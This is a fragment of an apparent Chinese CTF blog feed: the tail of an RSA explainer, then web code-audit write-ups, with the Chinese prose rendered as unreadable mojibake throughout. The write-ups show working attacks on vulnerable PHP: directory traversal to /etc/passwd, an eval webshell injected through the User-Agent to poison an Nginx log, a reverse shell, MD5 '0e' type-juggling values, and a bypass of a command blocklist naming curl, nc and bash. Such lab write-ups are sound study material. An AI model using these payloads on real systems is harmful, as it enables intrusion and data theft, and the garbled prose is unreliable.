æ•°</p><p><code>c</code>ï¼šå¯†æ–‡</p><p><code>m</code>ï¼šæ˜æ–‡</p><p><code>n,e</code>æ˜¯å…¬å¼€çš„æƒ…å†µä¸‹ï¼Œæƒ³è¦çŸ¥é“<code>d</code>çš„å€¼ï¼Œå¿…é¡»è¦å°†<code>n</code>åˆ†è§£è®¡ç®—å‡º<code>n</code>çš„æ¬§æ‹‰å‡½æ•°å€¼ï¼Œè€Œ<code>n</code>æ˜¯ä¸¤ä¸ªå¤§ç´ æ•°<code>pï¼Œq</code>çš„ä¹˜ç§¯ï¼Œå°†å…¶åˆ†è§£æ˜¯å›°éš¾çš„ã€‚</p><h3 id="ç”Ÿæˆå¯†é’¥"><a href="#ç”Ÿæˆå¯†é’¥" class="headerlink" title="ç”Ÿæˆå¯†é’¥"></a>ç”Ÿæˆå¯†é’¥</h3><p>å–ä¸¤ä¸ªå¤§è´¨æ•°<code>p,q</code>ï¼Œå¹¶è®¡ç®—ä»–ä»¬çš„ä¹˜ç§¯<code>n</code>ï¼Œä¸€èˆ¬è¦æ±‚<code>n</code>æ¢ç®—æˆäºŒè¿›åˆ¶è¦å¤§äº2048ä½</p><p>åˆ™æ ¹æ®æ¬§æ‹‰å®šç†æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼ˆæ¬§æ‹‰å‡½æ•°ï¼‰ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172139842.png" alt loading="lazy"></p><p>è®¡ç®—<code>n</code>çš„æ¬§æ‹‰å‡½æ•°å€¼</p><p>é€‰æ‹©ä¸€ä¸ªæ•°<code>e</code>ä½¿å¾—<code>e</code>ä¸<code>n</code>çš„æ¬§æ‹‰å‡½æ•°å€¼äº’è´¨ï¼Œä¸€èˆ¬é€‰æ‹©65537</p><p>è®¡ç®—<code>e</code>ç›¸å¯¹<code>n</code>çš„æ¬§æ‹‰å‡½æ•°å€¼çš„æ¨¡åå…ƒç´ <code>d</code>ï¼Œå› ä¸º<code>e</code>ä¸<code>n</code>çš„æ¬§æ‹‰å‡½æ•°å€¼äº’è´¨ï¼Œåˆ™æ ¹æ®æ¨¡åå…ƒç´ çš„æ€§è´¨</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172706077.png" alt loading="lazy"></p><p>æ ¹æ®æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼Œé€šè¿‡è¿­ä»£æ±‚è§£å³å¯è§£å‡º<code>d</code>ï¼Œéšåå³ç”Ÿæˆå…¬é’¥<code>(e,N)</code>ï¼Œç§é’¥<code>(d,N)</code></p><h3 id="åŠ è§£å¯†çš„å®ç°"><a href="#åŠ è§£å¯†çš„å®ç°" class="headerlink" title="åŠ è§£å¯†çš„å®ç°"></a>åŠ è§£å¯†çš„å®ç°</h3><p>åŠ å¯†ï¼š</p><p><code>m</code>ä¸ºè¦åŠ å¯†çš„ä¿¡æ¯ï¼Œ<code>(e,n)</code>ç»„åˆèµ·æ¥ä¸ºå…¬é’¥ï¼Œ<code>c</code>å’Œ<code>k</code>åˆ†åˆ«ä¸ºå¸¸æ•°</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211116338.png" alt loading="lazy"></p><p>è§£å¯†ï¼š</p><p><code>m</code>ä¸ºè¦è§£å¯†çš„ä¿¡æ¯ï¼Œ<code>(d,n)</code>ç»„åˆèµ·æ¥ä¸ºç§é’¥ï¼Œ<code>c</code>å’Œ<code>k</code>åˆ†åˆ«ä¸ºå¸¸æ•°</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211144409.png" alt loading="lazy"></p><p>ä¸¤ä¸ªå…¬å¼å¯ç›¸äº’æ¨å¯¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;æ•°è®ºçŸ¥è¯†&quot;&gt;&lt;a href=&quot;#æ•°è®ºçŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;æ•°è®ºçŸ¥è¯†&quot;&gt;&lt;/a&gt;æ•°è®ºçŸ¥è¯†&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;äº’è´¨&lt;/strong&gt;ï¼šå¦‚æœä¸¤ä¸ªæ­£æ•´æ•°ï¼Œé™¤äº† 1 ä»¥å¤–æ²¡æœ‰å…¶ä»–çš„å…¬å› æ•°ï¼Œåˆ™ä»–ä»¬äº’è´¨ã€‚æ¯”å¦‚ï¼Œ
      
    
    </summary>
    
    
      <category term="ç®—æ³•" scheme="https://www.extrader.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ç®—æ³•" scheme="https://www.extrader.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>36Dæ¯äº”é“ä»£ç å®¡è®¡é¢˜</title>
    <link href="https://www.extrader.top/posts/e53b958d/"/>
    <id>https://www.extrader.top/posts/e53b958d/</id>
    <published>2020-06-03T16:00:00.000Z</published>
    <updated>2020-07-14T12:52:02.630Z</updated>
    
    <content type="html"><![CDATA[<p>â€œæ¸©æ•…è€ŒçŸ¥æ–°ï¼Œå¯ä»¥ä¸ºå¸ˆçŸ£â€â€”â€”å­”å­ã€Šè®ºè¯­ã€‹</p><span id="more"></span><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>è®¿é—®<code>index.php.bak</code>å¾—åˆ°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">visit all_info_u_want.php and you will get all information you want= =Thinking that it may be difficult, i decided to show you the source code:<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//give you all information you want</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'all_info_i_want'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/"</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//really baby include</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>really really really baby challenge right? </code></pre><p>æ ¹æ®æºç æç¤ºä¼ å…¥<code>all_info_u_want.php?all_info_i_want</code>ï¼Œå¾—åˆ°<code>phpinfo()</code>çš„ç»“æœï¼Œ<code>flag</code>å¹¶ä¸åœ¨è¿™é‡Œ</p><p>ä¼ å…¥<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>ï¼Œå¯ä»¥çœ‹åˆ°<code>/etc/passwd</code>çš„å†…å®¹ï¼Œç›®å½•ç©¿è¶Šï¼Œå†ä¼ å…¥<code>all_info_u_want.php?file=../../../../../../flag</code>è¯•å›¾è¯»å–flagï¼Œå¾—åˆ°ä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><code>flag&#123;this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself&#125;</code></p><p>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“flagåº”è¯¥åœ¨<code>etc</code>ç›®å½•ä¸‹ï¼Œæ…¢çŒœä¸å¥½æï¼Œæ²¡é‚£ä¸ªè¿æ°”</p><p>å…ˆæ¥çœ‹çœ‹ç”¨çš„æ˜¯ä»€ä¹ˆwebæœåŠ¡å™¨ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°æ˜¯<code>Nginx</code>æœåŠ¡å™¨ï¼Œå°è¯•è¯»å–<code>Nginx</code>çš„æ•æ„Ÿä¿¡æ¯æ–‡ä»¶ï¼Œç½‘ä¸ŠæŸ¥å¾—<code>Nginx</code>çš„è®¿é—®æ—¥å¿—æ–‡ä»¶é»˜è®¤è·¯å¾„ä¸º<code>/var/log/nginx/access.log</code>ï¼Œå°è¯•è¯»å–ï¼Œå¾—åˆ°æ—¥å¿—æ–‡ä»¶ç»“æœï¼Œè¯¥æ—¥å¿—æ–‡ä»¶å›ä¿å­˜è®¿é—®çš„<code>User-Agent</code>çš„å†…å®¹ï¼Œç»“åˆæ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>User-Agent</code>ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œ<code>getshell</code>ï¼Œ</p><pre class="language-none"><code class="language-none">GET &#x2F;all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log HTTP&#x2F;1.1Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.showUser-Agent: &lt;?php phpinfo();?&gt;</code></pre><p>æˆåŠŸæ‰§è¡Œphpä»£ç ï¼Œäºæ˜¯ä¼ å…¥<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>åˆ©ç”¨passåå¼¹shellåæ‰§è¡Œ<code>find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code>ï¼Œå¾—åˆ°flag</p><h3 id="WEB-WUSTCTFæœ´å®æ— åRevenge"><a href="#WEB-WUSTCTFæœ´å®æ— åRevenge" class="headerlink" title="WEB_WUSTCTFæœ´å®æ— åRevenge"></a>WEB_WUSTCTFæœ´å®æ— åRevenge</h3><p>æ‹¿åˆ°é¢˜ç›®å¾—åˆ°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è·å–å˜é‡çš„æ•´æ•°å€¼</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// åè½¬å­—ç¬¦ä¸²</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¿«åˆ°éæ´²äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å…ˆä¸€å±‚å±‚ç»•è¿‡ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ª<code>if</code>ï¼Œä¼ å…¥numï¼Œç®€å•æ¥è¯´å°±æ˜¯</p><ul><li>numç»“æœå–æ•´åå’ŒåŸæ¥çš„å­—ç¬¦ä¸²éœ€è¦ç›¸ç­‰ï¼Œä½†æ˜¯è¿™é‡Œåªéœ€è¦<code>==</code>å³å¯</li><li>numéœ€è¦ä¸ºæ•°å­—ï¼Œå–æ•´åçš„æ•°å­—ä¸èƒ½å°äº-999999999999999999æˆ–è€…å¤§äº999999999999999999</li><li>numåœ¨ç»è¿‡å–æ•´å’Œåè½¬å­—ç¬¦ä¸²åå–æ•´åçš„æ•°å­—éœ€è¦ç›¸ç­‰</li><li>numç»è¿‡<code>isPalindrome</code>å‡½æ•°è¿”å›çš„å€¼éœ€è¦ä¸º<code>false</code></li></ul><p>å†æ¥çœ‹çœ‹<code>isPalindrome</code>å‡½æ•°ï¼Œå­—ç¬¦ä¸²ä¸¤è¾¹å¯¹ç§°çš„æ•°å­—éœ€è¦æœ‰ä¸ä¸€æ ·ï¼Œæ‰èƒ½ä½¿<code>$l=0</code>ï¼Œè¿”å›<code>false</code>è¿™æ ·ä¸å‰é¢çš„æ¡ä»¶å°±çŸ›ç›¾äº†ï¼Œåè½¬ååˆéœ€è¦ç›¸ç­‰ï¼Œåˆä¸èƒ½å¯¹ç§°ã€‚</p><p>ä»¥ä¸‹æä¾›ä¸¤ç§ç»•è¿‡æ–¹å¼ï¼š</p><pre class="language-none"><code class="language-none">00.01000000000000000.00000000000000010</code></pre><p>ç¬¬ä¸€ç§ç¡®å®æ˜¯æ²¡æœ‰ä»»ä½•æ“ä½œå°±ç›´æ¥ç»•è¿‡äº†ï¼Œè€Œç¬¬äºŒç§åˆ™æ˜¯æµ®ç‚¹æ•°çš„ç²¾åº¦é—®é¢˜ï¼Œåœ¨æœåŠ¡å™¨ä¸Š</p><p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p><p>æ˜¯å¯ä»¥è¿”å›trueçš„ï¼Œä½†æ˜¯æˆ‘åœ¨æœ¬åœ°æµ‹è¯•åˆ°</p><p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p><p>å°±è¿”å›falseäº†ï¼Œä¸çŸ¥é“ä»€ä¹ˆé¬¼-.-</p><p>å†ç»•è¿‡ç¬¬äºŒä¸ªif</p><p>è¿™ä¸ªéœ€è¦è®©<code>$md5==md5(md5($md5))</code>ï¼Œå¼±æ¯”è¾ƒï¼Œç»•å¦‚æœmd5=0exxxxxxxxï¼Œç»è¿‡ä¸¤æ¬¡md5åŠ å¯†åçš„md5å€¼ä¹Ÿä¸º0exxxxxxxxï¼Œå³å¯ç»•è¿‡</p><p>å†™ä¸ªè„šæœ¬çˆ†ç ´å³å¯ï¼Œè¿™æ ·çš„å­—ç¬¦ä¸²æŒºå¤šçš„ï¼Œä»¥ä¸‹åˆ—ä¸¾å‡ ä¸ªï¼š</p><pre class="language-none"><code class="language-none">0e3900184182-&gt;0e1418721190302697727652753637950e6201668706-&gt;0e7985422574949326206502419486330e6702291282-&gt;0e1005063503807650968114418218160e1808236718-&gt;0e9355671365452205537103932527520e9507776345-&gt;0e8846062744707241436539484045430e7208324299-&gt;0e0296373600831971546521412019920e2010692162-&gt;0e5148989988791743362037461270580e9410970854-&gt;0e4302790236499053907065604760830e3511282263-&gt;0e657335831331991043075342997270</code></pre><p>å†åˆ°æœ€åget flag</p><p>è¿‡æ»¤äº†æŒºå¤šçš„å‘½ä»¤ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç»•è¿‡ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">nl<span class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">nl</span>rev<span 